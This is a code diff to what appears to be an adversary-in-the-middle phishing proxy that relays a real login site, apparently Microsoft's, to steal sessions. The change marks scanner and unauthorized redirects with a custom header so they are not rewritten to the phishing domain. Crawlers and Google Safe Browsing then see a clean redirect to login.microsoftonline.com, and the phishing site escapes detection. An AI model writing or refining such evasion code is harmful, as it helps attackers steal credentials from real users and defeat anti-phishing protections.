@@ -1205,9 +1205,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             req_hostname := strings.ToLower(resp.Request.Host)
 
             // Rewrite redirect Location headers back to the phishing host, except for
-            // crawler/scanner responses - their Location points at the real site on
-            // purpose (Google Safe Browsing must see a clean redirect, not a loop).
-            if !isScannerUA(resp.Request.UserAgent()) {
+            // crawler/scanner responses and for synthetic unauthorized-redirect
+            // responses. Those point at the real site (e.g. login.microsoftonline.com)
+            // on purpose: Safe Browsing must see a clean external redirect, and
+            // rewriting them back to the phished host would cause a redirect loop
+            // (the phished host is not a valid lure path and has no session yet).
+            is_unauth_redirect := resp.Header.Get("X-UnAuth-Redirect") == "1"
+            resp.Header.Del("X-UnAuth-Redirect")
+            if !is_unauth_redirect && !isScannerUA(resp.Request.UserAgent()) {
                 r_url, err := resp.Location()
                 if err == nil {
                     if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
@@ -1635,6 +1640,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
         if resp != nil {
             resp.Header.Set("Location", unauth_url)
             resp.Header.Set("Cache-Control", "no-cache, no-store")
+            resp.Header.Set("X-UnAuth-Redirect", "1")
             return req, resp
         }
     }
@@ -1724,6 +1730,7 @@ func (p *HttpProxy) scannerRedirect(req *http.Request) (*http.Request, *http.Res
     if resp != nil {
         resp.Header.Set("Location", target)
         resp.Header.Set("Cache-Control", "no-cache, no-store")
+        resp.Header.Set("X-UnAuth-Redirect", "1")
         return req, resp
     }
     return p.blockRequest(req)
